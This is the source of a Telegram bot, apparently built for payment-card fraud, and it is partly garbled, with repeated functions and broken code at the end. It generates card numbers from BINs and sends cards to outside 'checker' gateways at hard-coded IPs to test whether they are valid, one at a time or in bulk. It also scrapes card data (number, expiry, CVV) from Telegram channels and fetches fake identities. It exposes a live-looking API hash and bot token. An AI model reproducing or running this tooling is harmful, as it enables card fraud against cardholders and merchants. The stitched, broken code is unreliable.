👤 <b>User:</b> <a href="tg://user?id={user_id}">{username}</a>  
🆔 <b>User ID:</b> <code>{user_id}</code>  
💳 <b>Current Balance:</b> {balance} Credits  
━━━━━━━━━━━━━━  
🚀 <b>Use Your Credits Now!</b>
""", parse_mode="HTML")


bot = telebot.TeleBot(BOT_TOKEN)
authorized_users = {}

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            country_name = data.get('country', {}).get('name', 'Unknown')
            country_emoji = data.get('country', {}).get('emoji', '')
            bank_name = data.get('bank', {}).get('name', 'Unknown')
            brand = data.get('brand', 'Unknown')
            card_type = data.get('type', 'Unknown')
            scheme = data.get('scheme', 'Unknown')
            return {
                'country_name': country_name,
                'country_emoji': country_emoji,
                'bank_name': bank_name,
                'brand': brand,
                'card_type': card_type,
                'scheme': scheme
            }
    except Exception as e:
        print(f"BIN lookup error: {e}")
    return {
        'country_name': 'Unknown',
        'country_emoji': '',
        'bank_name': 'Unknown',
        'brand': 'Unknown',
        'card_type': 'Unknown',
        'scheme': 'Unknown'
    }

def generate_card(bin_str, exp_month, exp_year, cvv):
    card_num = ""
    for ch in bin_str:
        if ch.lower() == 'x':
            card_num += str(random.randint(0,9))
        elif ch.isdigit():
            card_num += ch
    while len(card_num) < 16:
        card_num += str(random.randint(0,9))
    return f"{card_num}|{exp_month}|{exp_year}|{cvv}"

def is_authorized(user_id):
    if user_id in authorized_users:
        if datetime.now() < authorized_users[user_id]:
            return True
        else:
            authorized_users.pop(user_id)
    return False


def is_authorized(user_id):
    if user_id in authorized_users:
        if datetime.now() < authorized_users[user_id]:
            return True
        else:
            authorized_users.pop(user_id)
    return False

def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            country_name = data.get('country', {}).get('name', 'Unknown')
            country_emoji = data.get('country', {}).get('emoji', '')
            bank_name = data.get('bank', {}).get('name', 'Unknown')
            brand = data.get('brand', 'Unknown')
            card_type = data.get('type', 'Unknown')
            scheme = data.get('scheme', 'Unknown')
            return {
                'country_name': country_name,
                'country_emoji': country_emoji,
                'bank_name': bank_name,
                'brand': brand,
                'card_type': card_type,
                'scheme': scheme
            }
    except Exception as e:
        print(f"BIN lookup error: {e}")
    return {
        'country_name': 'Unknown',
        'country_emoji': '',
        'bank_name': 'Unknown',
        'brand': 'Unknown',
        'card_type': 'Unknown',
        'scheme': 'Unknown'
    }

def generate_card(bin_str, exp_month, exp_year, cvv):
    card_num = ""
    for ch in bin_str:
        if ch.lower() == 'x':
            card_num += str(random.randint(0,9))
        elif ch.isdigit():
            card_num += ch
    while len(card_num) < 16:
        card_num += str(random.randint(0,9))
    return f"{card_num}|{exp_month}|{exp_year}|{cvv}"

@bot.message_handler(commands=['add'])
def add_user(message):
    try:
        parts = message.text.split()
        if len(parts) != 3:
            bot.reply_to(message, "Usage: /add <user_id> <days>")
            return

        admin_id = message.from_user.id
        if admin_id != YOUR_ADMIN_ID:
            bot.reply_to(message, "🚫 You are not authorized to add users.")
            return

        user_id = int(parts[1])
        days = int(parts[2])
        authorized_users[user_id] = datetime.now() + timedelta(days=days)
        bot.reply_to(message, f"User {user_id} authorized for {days} days.")
    except Exception:
        bot.reply_to(message, "Error processing command. Usage: /add <user_id> <days>")

@bot.message_handler(commands=['gen'])
def gen_command(message):
    user_id = message.from_user.id
    if not is_authorized(user_id):
        bot.reply_to(message, "🚫 You are not authorized to use this command.")
        return

    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            raise IndexError("No arguments provided")

        param = args[1].strip()

        if '|' in param:
            parts = param.split('|')
            if len(parts) != 4:
                raise IndexError("Wrong number of arguments")
            bin_str = parts[0].strip()
            exp_month = parts[1].strip()
            exp_year = parts[2].strip()
            cvv = parts[3].strip()
            if not re.match(r"^(0[1-9]|1[0-2])$", exp_month):
                bot.reply_to(message, "⚠️ Error: Invalid expiration month format.\n\n📘 Usage Guide:\nFormat 1: /gen BIN|MM|YYYY|CVV\nExample: /gen 424242xxxxxx|12|2028|123\nFormat 2: /gen BIN (auto MM/YY/CVV)\n\n👑 Powered by: @SLAYER_OP7")
                return
            if not re.match(r"^\d{3}$", cvv):
                bot.reply_to(message, "⚠️ Error: Invalid CVV format.\n\n📘 Usage Guide:\nFormat 1: /gen BIN|MM|YYYY|CVV\nExample: /gen 424242xxxxxx|12|2028|123\nFormat 2: /gen BIN (auto MM/YY/CVV)\n\n👑 Powered by: @SLAYER_OP7")
                return
        else:
            bin_str = param
            now = datetime.now()
            exp_month = now.strftime("%m")
            exp_year = str(now.year + 5)
            cvv = "".join(str(random.randint(0,9)) for _ in range(3))

        cards = [generate_card(bin_str, exp_month, exp_year, cvv) for _ in range(10)]

        bin_lookup = bin_str[:6].replace('x', '0').replace('X', '0')
        info = get_bin_info(bin_lookup)

        message_text = f"𝗕𝗜𝗡 ⇾ `{bin_lookup}`\n𝗔𝗺𝗼𝘂𝗻𝘁 ⇾ `10`\n\n"
        message_text += "\n".join(cards) + "\n\n"

        card_type = info['card_type'].upper()
        brand = info['brand'].upper()
        issuer = info['bank_name']
        country = info['country_name']
        emoji = info['country_emoji']

        message_text += f"𝗜𝗻𝗳𝗼: {card_type} - {brand}\n"
        message_text += f"𝐈𝐬𝐬𝐮𝐞𝐫: {issuer}\n"
        message_text += f"𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {emoji}\n\n"


        bot.send_message(message.chat.id, message_text)

    except IndexError:
        bot.reply_to(message, f"⚠️ Error: list index out of range\n\n📘 Usage Guide:\nFormat 1: /gen BIN|MM|YYYY|CVV\nExample: /gen 424242xxxxxx|12|2028|123\nFormat 2: /gen BIN (auto MM/YY/CVV)\n\n👑 Powered by: @SLAYER_OP7")
    except Exception as e:
        bot.reply_to(message, f"⚠️ Error: {str(e)}\n\n📘 Usage Guide:\nFormat 1: /gen BIN|MM|YYYY|CVV\nExample: /gen 424242xxxxxx|12|2028|123\nFormat 2: /gen BIN (auto MM/YY/CVV)\n\n👑 Powered by: @SLAYER_OP7")

# Custom API URL for Braintree card checking
API_URL = "http://194.164.150.141:8099/key=darkk/cc="

# Function to check card using the custom Braintree API
def check_card(card_number):
    # Construct the URL with the card number
    url = f"{API_URL}{card_number}"
    
    try:
        # Make the HTTP GET request to the custom Braintree API
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()  # Assuming the API returns JSON data
            
            # Extract card details from the response
            return {
                "status": data.get("status", "Unknown"),
                "tok": card_number[:6],  # BIN (first 6 digits)
                "bank_name": data.get("bank_name", "N/A"),
                "card_type": data.get("card_type", "N/A"),
                "country_name": data.get("country_name", "N/A"),
                "country_flag": data.get("country_flag", "❌"),
            }
        else:
            return {
                "status": "Error",
                "tok": card_number[:6],
                "bank_name": "N/A",
                "card_type": "N/A",
                "country_name": "N/A",
                "country_flag": "❌",
            }
    except Exception as e:
        # Handle any errors during the request
        return {
            "status": "Error",
            "tok": card_number[:6],
            "bank_name": "N/A",
            "card_type": "N/A",
            "country_name": "N/A",
            "country_flag": "❌",
        }

# Function to get BIN details
def get_bin_info(bin_number):
    try:
        response = requests.get(f"https://lookup.binlist.net/{bin_number}")
        if response.status_code == 200:
            data = response.json()
            bank = data.get("bank", {}).get("name", "Unknown Bank")
            card_type = data.get("type", "Unknown").capitalize()
            country = data.get("country", {}).get("name", "Unknown Country")
            country_emoji = data.get("country", {}).get("emoji", "🌍")
            return bank, card_type, country, country_emoji
        else:
            return "Unknown Bank", "Unknown", "Unknown Country", "🌍"
    except:
        return "Unknown Bank", "Unknown", "Unknown Country", "🌍"

# Command handler for /b3
@bot.message_handler(commands=["b3"])
def handle_b3(message):
    user_input = message.text.split()[1:]  # Get user input (cards list after /b3 command)
    if not user_input:
        bot.reply_to(message, "Please provide a list of card numbers to check.")
        return
    
    # Start time tracking
    start_time = time.time()

    # Check cards one by one
    checked_cards = []
    for card in user_input:
        card_details = check_card(card.strip())
        
        # Extract details from card_details
        status = card_details["status"]
        bank_name = card_details["bank_name"]
        card_type = card_details["card_type"]
        country_name = card_details["country_name"]
        country_flag = card_details["country_flag"]
        tok = card_details["tok"]
        
        # Get response time
        response_time = round(time.time() - start_time, 2)

        # Build the response message using the provided format
        response = f"""
╭─━━━━━━━━━━━━━━━━━━━─╮
    🎩 𝘽𝙍𝘼𝙄𝙉𝙏𝙍𝙀𝙀 𝘾𝙃𝙀𝘾𝙆𝙀𝙍 🎩
╰─━━━━━━━━━━━━━━━━━━━─╯

📌 Card: <code>{card.strip()}</code>  
📌 Status: <code>{status}</code>
📌 Gateway: <code>Braintree Auth</code>
📌 BIN: <code>{tok}</code>
📌 Bank: <code>{bank_name}</code>
📌 Type: <code>{card_type}</code>
📌 Country: <code>{country_name} {country_flag}</code>
📌 Checked By: <code>{message.from_user.username if message.from_user else "Unknown"}</code>
📌 Response Time: <code>{response_time}s</code>

╭─━━━━━━━━━━━━━━━─╮
        𝗠𝗨𝗦𝗧𝗔𝗙𝗔  𝗕𝗢𝗧
╰─━━━━━━━━━━━━━━━─╯
        """
        checked_cards.append(response)
    
    # Send the results back to the user
    bot.reply_to(message, '\n'.join(checked_cards), parse_mode="HTML", disable_web_page_preview=True)


LOGS_GROUP_CHAT_ID = -1002576465941# Replace with your logs group chat ID
owners = {"6353114118", "6353114118"}  # Replace with actual owner IDs




@bot.message_handler(commands=["remove"])
def remove_user_command(message):
    if str(message.from_user.id) not in owners:
        bot.reply_to(message, "❌ You are not authorized to perform this action.")
        return
    
    parts = message.text.split()
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Please provide a user ID to remove. Usage: /remove <user_id>")
        return
    
    user_id_to_remove = parts[1]
    try:
        with open("id.txt", "r") as file:
            lines = file.readlines()
        
        valid_lines = []
        user_removed = False
        for line in lines:
            line = line.strip()
            if not line:
                continue  # Skip empty lines
            
            parts = line.split(":")
            if len(parts) != 2:
                print(f"Skipping invalid entry: {line}")
                continue  # Skip malformed lines
            
            user, expire = parts
            if user == user_id_to_remove:
                user_removed = True
                bot.send_message(user_id_to_remove, "❌ Your access has expired, and you are no longer authorized.")
                continue  # Remove this user
            
            valid_lines.append(f"{user}:{expire}")
        
        with open("id.txt", "w") as file:
            file.write("\n".join(valid_lines) + "\n")
        
        if user_removed:
            log_message = (
                f"<b>🗑️ User Removed</b>\n"
                f"👤 <b>User ID:</b> <code>{user_id_to_remove}</code>\n"
            )
            bot.send_message(LOGS_GROUP_CHAT_ID, log_message, parse_mode="HTML")
            bot.reply_to(message, f"✅ User {user_id_to_remove} removed successfully.")
        else:
            bot.reply_to(message, "⚠️ User not found in the authorized list.")
    
    except FileNotFoundError:
        bot.reply_to(message, "⚠️ Authorization file not found.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {e}")



# Define owners (replace with actual owner IDs)
owners = {"6353114118", "6353114118"}  # Example owner Telegram IDs

@bot.message_handler(commands=["info"])
def user_info(message):
    user_id = str(message.chat.id)
    first_name = message.from_user.first_name or "N/A"
    last_name = message.from_user.last_name or "N/A"
    username = message.from_user.username or "N/A"
    profile_link = f"<a href='tg://user?id={user_id}'>Profile Link</a>"

    # Get current time & day
    current_time = datetime.now().strftime("%I:%M %p")
    current_day = datetime.now().strftime("%A, %b %d, %Y")

    # Default status
    if user_id in owners:
        status = "👑 Owner 🛡️"
    else:
        status = "⛔ Not-Authorized ❌"

    try:
        with open("id.txt", "r") as file:
            allowed_ids = file.readlines()
            for line in allowed_ids:
                parts = line.strip().split(":")
                if len(parts) == 2:
                    user, expire = parts
                    if user_id == user:
                        expiry_time = float(expire)
                        if expiry_time > time.time():
                            status = "✅ Authorized User"
                        else:
                            status = "❌ Access Expired"
                        break
    except FileNotFoundError:
        status = "⚠️ Authorization File Missing"

    response = f"""
<code>╭──────────────────────────
│ 🔍 𝚄𝚂𝙴𝚁 𝙸𝙽𝙵𝙾 🔥
╰──────────────────────────</code>

👤 <b>First Name:</b> {first_name}  
👤 <b>Last Name:</b> {last_name}  
🆔 <b>User ID:</b> <code>{user_id}</code>  
📛 <b>Username:</b> @{username}  
🔗 <b>Profile Link:</b> {profile_link}  
📋 <b>Status:</b> {status}  

<code>╭──────────────────────────
│ 🕒 𝚃𝙸𝙼𝙴 & 𝙳𝙰𝚃𝙴 📆
╰──────────────────────────</code>

🕒 <b>Time:</b> {current_time}  
📆 <b>Day:</b> {current_day}  

<code>╭──────────────────────────
│ 🚀 𝑴𝑼𝑺𝑻𝑨𝑭𝑨 𝑪𝑨𝑹𝑫𝑬𝑹 𝑩𝑶𝑻 🔥
╰──────────────────────────</code>
"""
    bot.reply_to(message, response, parse_mode="HTML", disable_web_page_preview=True)

    # Function to fetch fake identity details from fakexy.com based on country code
def get_fake_identity(country_code):
    url = f'http://fakexy.com/{country_code}'
    
    try:
        # Send the HTTP request to the website
        response = requests.get(url)
        response.raise_for_status()  # Will raise an error for bad responses

        # Parse the content with BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # Assuming the identity details are in a specific format. Modify as needed.
        name = soup.find('span', {'class': 'name'}).text.strip()
        email = soup.find('span', {'class': 'email'}).text.strip()
        street = soup.find('span', {'class': 'street'}).text.strip()
        city = soup.find('span', {'class': 'city'}).text.strip()
        state = soup.find('span', {'class': 'state'}).text.strip()
        country = soup.find('span', {'class': 'country'}).text.strip()
        zip_code = soup.find('span', {'class': 'zip'}).text.strip()
        dob = soup.find('span', {'class': 'dob'}).text.strip()
        
        # Format the identity details
        identity = f"""
Random Identity Generated ✅

Name : {name}
Email : {email}
Street : {street}
City : {city}
State : {state}
Country : {country}
Zip code : {zip_code}
Date of Birth : {dob}

Powered By ➺ @SLAYER_OP7
"""
        return identity
    
    except requests.exceptions.RequestException as e:
        return f"Error fetching data: {e}"

# Command handler for /fake
@bot.message_handler(commands=['fake'])
def handle_fake(message):
    # Split the command to get the country code
    parts = message.text.split()
    
    if len(parts) != 2:
        bot.reply_to(message, "Please use the command in the format: /fake <country_code>")
        return
    
    country_code = parts[1].lower()  # e.g., "us", "ca", "uae"

    # Fetch the details for that country
    fake_identity = get_fake_identity(country_code)
    
    # Send the result back to the user
    bot.reply_to(message, fake_identity
    
    
    )











app = Client("scraper_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Define regex pattern to match "cc" lines (you can update this to match your exact format)
cc_pattern = r'\d{16}\|\d{2}\|\d{2}\|\d{3,4}'  # e.g., 1234567812345678|01|25|123

@app.on_message(filters.command("scr"))
async def scrap_cc(client, message: Message):
    args = message.text.split()

    if len(args) != 3:
        await message.reply("❌ Usage: /scr <channel_username> <amount>\nExample: /scr @inkbins 50")
        return

    channel_username = args[1]
    try:
        limit = int(args[2])
    except ValueError:
        await message.reply("❌ Amount must be a number.")
        return

    start_time = time.time()
    found_ccs = []
    removed = 0

    try:
        async for msg in app.get_chat_history(channel_username, limit=1000):
            if len(found_ccs) >= limit:
                break
            if msg.text:
                matches = re.findall(cc_pattern, msg.text)
                for cc in matches:
                    if len(found_ccs) < limit:
                        found_ccs.append(cc)
                    else:
                        break

    except UsernameNotOccupied:
        await message.reply("❌ Channel username not found.")
        return
    except ChannelPrivate:
        await message.reply("🔐 I can't access this channel. Make sure it's public or the bot is a member.")
        return
    except Exception as e:
        await message.reply(f"⚠️ Error: {e}")
        return

    removed = max(0, limit - len(found_ccs))
    total_time = round(time.time() - start_time, 2)

    # Prepare output file
    file_path = "/tmp/found_ccs.txt"
    with open(file_path, "w") as f:
        f.write("\n".join(found_ccs))

    # Custom message
    result_msg = (
        "• 𝙄𝙎𝘼𝙂𝙄 𝙎𝘾𝙍𝘼𝙋𝙋𝙀𝙍\n\n"
        f"• 𝐒𝐞𝐚𝐫𝐜𝐡: None\n"
        f"• 𝐒𝐨𝐮𝐫𝐜𝐞: {channel_username.strip('@')}\n"
        f"• 𝐀𝐦𝐨𝐮𝐧𝐭: {limit}\n"
        f"• 𝐅𝐨𝐮𝐧𝐝: {len(found_ccs)}\n"
        f"• 𝐑𝐞𝐦𝐨𝐯𝐞𝐝: {removed}\n\n"
        f"• 𝐓𝐢𝐦𝐞: {total_time} 𝐬𝐞𝐜𝐨𝐧𝐝𝐬\n"
        f"• 𝐑𝐞𝐪 𝐁𝐲: [{message.from_user.first_name}](tg://openmessage?user_id={message.from_user.id})\n"
        f"• 𝐁𝐨𝐭 𝐁𝐲: ⏤͟͞𝙋𝙍𝙄𝙈𝙀𝙭𝙄𝙎𝘼𝙂𝙄 (https://t.me/SLAYER_OP7)"
    )

    await message.reply_document(
        InputFile(file_path),
        caption=result_msg,
        quote=True
    )






    # API endpoint for card checking
GATEWAY_URL = "http://147.93.105.138:1111/gate=str/key=wasdark/cc={}"

# Helper function to check a single card
def check_card(card_details):
    try:
        response = requests.get(GATEWAY_URL.format(card_details))
        data = response.json()
        status = data.get('status')
        card_result = data.get('message', 'Unknown error')
        brand = data.get('brand', 'Unknown')
        card_type = data.get('card_type', 'Unknown')
        bank = data.get('bank', 'Unknown')
        country = data.get('country', 'Unknown')
        return status, card_result, brand, card_type, bank, country
    except requests.exceptions.RequestException as e:
        return 'ERROR', f'Failed to check card: {str(e)}', '', '', '', ''


# Get BIN info from binlist.net API
def get_bin_info(bin_part):
    try:
        response = requests.get(f'https://lookup.binlist.net/{bin_part}', timeout=24)
        if response.status_code == 200:
            data = response.json()
            return {
                'country': data.get('country', {}).get('name', 'Unknown'),
                'bank': data.get('bank', {}).get('name', 'Unknown'),
                'brand': data.get('brand') or data.get('scheme') or 'Unknown',
                'type': data.get('type', 'Unknown'),
                'scheme': data.get('scheme', 'Unknown')
            }
        else:
            return {
                'country': 'Unknown',
                'bank': 'Unknown',
                'brand': 'Unknown',
                'type': 'Unknown',
                'scheme': 'Unknown'
            }
    except Exception as e:
        print("BIN API error:", e)
        return {
            'country': 'Unknown',
            'bank': 'Unknown',
            'brand': 'Unknown',
            'type': 'Unknown',
            'scheme': 'Unknown'
        }

# Command handler for /chk (single card check)
@bot.message_handler(commands=['chk'])
def check(message):
    # Get the card from the user (expecting the format: CC|MM|YYYY|CVV)
    card_input = message.text.split(" ")[1:]  # Skips the command part
    
    if len(card_input) == 0:
        bot.reply_to(message, "Please provide a card in the format: CC|MM|YYYY|CVV.")
        return
    
    card_details = card_input[0]
    
    # Check the card
    status, card_result, brand, card_type, bank, country = check_card(card_details)

    if status == 'ERROR':
        response_message = f"""
𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: ❌ DECLINE                                                                                                
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[⌬] 𝐓𝐢𝐦𝐞: {round(time.time() - message.date, 2)} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: Unknown
[⎇] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━

"""
    else:
        response_message = f"""
#𝐏𝐫𝐞𝐦𝐢𝐮𝐦_𝐀𝐮𝐭𝐡 🔥 [/chk]
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐂𝐚𝐫𝐝: {card_details}
[ϟ] 𝐒𝐭𝐚𝐭𝐮𝐬: {status}
[ϟ] 𝐑𝐞𝐬𝐮𝐥𝐭: {card_result}
[ϟ] 𝐕𝐁𝐕 𝐒𝐭𝐚𝐭𝐮𝐬: {card_result}  
[ϟ] 𝐈𝐧𝐟𝐨: {brand} - {card_type}
[ϟ] 𝐁𝐚𝐧𝐤: {bank}
[ϟ] 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: {country}
━━━━━━━━━━━━━━━━━━━━━━━━━
[ϟ] 𝐓𝐢𝐦𝐞: {round(time.time() - message.date, 2)} 𝐒𝐞𝐜. || 𝐏𝐫𝐨𝐱𝐲: Unknown
[ϟ] 𝐑𝐞𝐪 𝐁𝐲: @{message.from_user.username or 'Unknown'}
━━━━━━━━━━━━━━━━━━━━━━━━━

"""

    # Send the response back to the user
    bot.reply_to(message, response_message)


# Command handler for /mchk (mass card check)
@bot.message_handler(commands=['mchk'])
def mass_check(message):
    # Get the list of cards from the user (expecting format: CC|MM|YYYY|CVV for each card)
    card_input = message.text.split("\n")[1:]  # Skips the command part
    
    if len(card_input) == 0:
        bot.reply_to(message, "Please provide cards in the format: CC|MM|YYYY|CVV (one card per line).")
        return
    
    # Initialize counters
    total = len(card_input)
    checked = 0
    approved = 0
    declined = 0
    errors = 0
    response_list = []
    start_time = time.time()

    for card_details in card_input:
        card_details = card_details.strip()
        if not card_details:
            continue

        status, card_result, brand, card_type, bank, country = check_card(card_details)
        
        if status == 'ERROR':
            errors += 1
            response_list.append(f"{card_details} | Status: ❌ Error - {card_result}")
            declined += 1
        else:
            checked += 1
            result = "✅ Approved" if 'approved' in card_result.lower() else "❌ Declined"
            if result == "✅ Approved":
                approved += 1
            response_list.append(f"{card_details} | Status: {result}")
            if result == "❌ Declined":
                declined += 1

    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # Formatting the mass check summary
    mass_check_summary = f"""
┌───────────────
│  ✧ Total: {total}
│  ✧ Checked: {checked}/{total}
│ ✅ Approved: {approved}
│ 🟡 CCN: {approved}
│ ❌ Declined: {declined}
│ ⚠️ Errors: {errors}
│ ⏱️ Time: {time_taken} S
└───────────────

Mass Check
─━─━─━─━─━─━─━─━─━─
"""
    # Add individual results for each card
    for result in response_list:
        mass_check_summary += f"{result}\n─━─━─━─━─━─━─━─━─━─\n"

    # Send the mass check summary
    bot.reply_to(message, mass_check_summary)

API_ID = 14861705  # your API_ID
API_HASH = "1e49cd230c4d124b231af27de9056413"
BOT_TOKEN = "7996462440:AAFbJjfCJdnBTGfsDWggqyS0gpKf53BBvfI"
app = Client("redeem_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)


app = Client("redeem_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# Config
REDEEM_CHANCE = 50
REDEEM_CODE_COUNT = 3
REDEEM_CODE_VALUE = 50
REDEEM_VALIDITY_DAYS = 7

# In-memory stores
valid_codes = {}  # code: {value, expires_at, used}
user_credits = {}  # user_id: credits

def generate_redeem_codes(n):
    codes = []
    for _ in range(n):
        code = f"ISAGI-{''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=6))}-KILLER"
        codes.append(code)
        valid_codes[code] = {
            "value": REDEEM_CODE_VALUE,
            "expires_at": datetime.now() + timedelta(days=REDEEM_VALIDITY_DAYS),
            "used": False
        }
    return codes

def create_redeem_message():
    codes = generate_redeem_codes(REDEEM_CODE_COUNT)
    message = (
        "🎉 𝗥𝗲𝗱𝗲𝗲𝗺 𝗚𝗲𝗻𝗲𝗿𝗮𝘁𝗲𝗱 ✅\n\n"
        f"✧ 𝘈𝘮𝘰𝘶𝘯𝘵 : {REDEEM_CODE_COUNT} codes\n"
        f"✧ 𝘝𝘢𝘭𝘶𝘦: {REDEEM_CODE_VALUE} credits each\n"
        f"✧ 𝘝𝘢𝘭𝘪𝘥𝘪𝘵𝘺: {REDEEM_VALIDITY_DAYS} days\n\n"
        + "\n".join(codes) + "\n\n"
        "How to redeem:\n"
        "Use /redeem CODE in this chat\n"
        "Example: /redeem ISAGI-51HWIOME-KILLER"
    )
    return message

@app.on_message(filters.private | filters.group)
async def random_redeem_drop(client, message):
    if random.random() < REDEEM_CHANCE:
        redeem_msg = create_redeem_message()
        await message.reply_text(redeem_msg)

@app.on_message(filters.command("redeem"))
async def redeem_code(client, message):
    parts = message.text.split()
    if len(parts) != 2:
        await message.reply("⚠️ Usage: /redeem YOUR-CODE-HERE")
        return

    code = parts[1].strip().upper()
    user_id = message.from_user.id

    if code not in valid_codes:
        await message.reply("❌ Invalid redeem code.")
        return

    code_data = valid_codes[code]
    if code_data["used"]:
        await message.reply("❌ This code has already been used.")
        return

    if datetime.now() > code_data["expires_at"]:
        await message.reply("⚠️ This code has expired.")
        return

    # Redeem successful
    credits = code_data["value"]
    user_credits[user_id] = user_credits.get(user_id, 0) + credits
    code_data["used"] = True

    await message.reply(
        f"✅ Code redeemed!\n"
        f"You've received {credits} credits.\n"
        f"💰 Total balance: {user_credits[user_id]} credits"
    )

@app.on_message(filters.command("balance"))
async def check_balance(client, message):
    user_id = message.from_user.id
    balance = user_credits.get(user_id, 0)
    await message.reply(f"💼 Your balance: {balance} credits")


def is_bot_stopped():
    return os.path.exists("stop.stop")

# Start the bot
bot.polling()
bot_stopped():
    return os.path.exists("stop.stop")

# Start the bot
bot.polling()
